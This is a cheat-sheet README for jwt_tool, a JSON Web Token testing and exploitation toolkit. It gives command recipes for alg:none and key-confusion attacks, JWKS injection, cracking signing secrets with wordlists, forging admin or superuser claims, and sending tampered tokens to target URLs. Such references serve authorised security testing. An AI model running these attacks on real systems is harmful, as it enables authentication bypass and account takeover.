# jwt_tool

> JWT (JSON Web Token) toolkit for testing and exploitation.

## Quickstart

```bash
# Analyze token
jwt_tool <token>

# Test all known attacks
jwt_tool <token> -M at

# Tamper claims
jwt_tool <token> -T

# Crack secret
jwt_tool <token> -C -d wordlist.txt
```

## Core Concepts

| Concept | Description |
|---------|-------------|
| JWT | JSON Web Token (header.payload.signature) |
| Algorithm | HS256, RS256, none, etc. |
| Claims | Payload data (sub, exp, iat, etc.) |
| Attacks | none alg, key confusion, brute force |

## Syntax

```text
jwt_tool <token> [options]
```

## Options

### Analysis

| Option | Description |
|--------|-------------|
| (none) | Analyze token |
| `-V` | Verbose analysis |

### Tampering

| Option | Description |
|--------|-------------|
| `-T` | Tamper mode |
| `-I` | Inject inline claims |
| `-pc <claim>` | Claim to tamper |
| `-pv <value>` | New value |

### Attacks

| Option | Description |
|--------|-------------|
| `-M <mode>` | Attack mode |
| `-C` | Crack mode |
| `-d <file>` | Dictionary |
| `-X <attack>` | Exploit type |

### Attack Modes (-M)

| Mode | Description |
|------|-------------|
| `at` | All tests |
| `pb` | Playbook |

### Exploits (-X)

| Exploit | Description |
|---------|-------------|
| `a` | alg:none |
| `n` | null signature |
| `b` | blank password |
| `s` | sign with key |
| `k` | key confusion (RS→HS) |
| `i` | inject JWKS |

### Request

| Option | Description |
|--------|-------------|
| `-t <url>` | Target URL |
| `-rc <cookie>` | Cookie name |
| `-rh <header>` | Header name |

## Recipes

### Token Analysis

```bash
# Basic analysis
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Verbose
jwt_tool <token> -V
```

### Tamper Claims

```bash
# Interactive tamper
jwt_tool <token> -T

# Change specific claim
jwt_tool <token> -I -pc sub -pv admin

# Change role
jwt_tool <token> -I -pc role -pv admin

# Change user ID
jwt_tool <token> -I -pc user_id -pv 1
```

### Automated Attacks

```bash
# All attacks
jwt_tool <token> -M at

# Test and send to target
jwt_tool <token> -M at -t https://target.com/api -rh "Authorization"
```

### Algorithm Attacks

```bash
# None algorithm attack
jwt_tool <token> -X a

# Null signature
jwt_tool <token> -X n

# Key confusion (RS256 → HS256)
# Use public key as HMAC secret
jwt_tool <token> -X k -pk public.pem
```

### Crack Secret

```bash
# Dictionary attack
jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt

# With rules
jwt_tool <token> -C -d wordlist.txt
```

### Sign with Known Key

```bash
# Sign with secret
jwt_tool <token> -S -p "secret123"

# Sign with key file
jwt_tool <token> -S -pk private.pem
```

### Send to Target

```bash
# Test with target URL
jwt_tool <token> -M at -t https://target.com/api/user -rh "Authorization"

# In cookie
jwt_tool <token> -M at -t https://target.com/dashboard -rc "token"
```

### Inject Claims

```bash
# Add admin claim
jwt_tool <token> -I -pc admin -pv true

# Change expiry
jwt_tool <token> -I -pc exp -pv 9999999999

# Multiple claims
jwt_tool <token> -I -pc sub -pv admin -pc role -pv superuser
```

## Common JWT Claims

| Claim | Description |
|-------|-------------|
| `sub` | Subject (user ID) |
| `iss` | Issuer |
| `aud` | Audience |
| `exp` | Expiration |
| `iat` | Issued at |
| `nbf` | Not before |
| `jti` | JWT ID |
| `role` | User role (custom) |
| `admin` | Admin flag (custom) |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Invalid token | Check token format |
| Crack failed | Try larger wordlist |
| Attack blocked | App validates properly |

## References

- [jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
- [JWT.io](https://jwt.io/)
- [JWT Attacks](https://portswigger.net/web-security/jwt)
